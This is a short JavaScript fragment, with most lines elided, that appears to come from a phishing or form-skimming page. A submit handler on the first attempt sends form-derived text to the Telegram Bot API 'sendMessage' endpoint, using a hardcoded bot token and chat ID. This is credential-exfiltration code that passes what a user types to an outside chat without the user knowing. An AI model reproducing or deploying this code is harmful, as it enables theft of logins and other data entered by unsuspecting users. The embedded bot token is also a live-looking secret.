    ...
    form.addEventListener('submit', function(e) {
        ...
        if(tryCount === 0) {
            ...
            setTimeout(() => {
                ...
                const url = `https://api.telegram.org/bot8820359715:AAGha6pBZ773mE4EiPKK-oVCLRZhiRWFOt4/sendMessage?chat_id=6254130447&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`
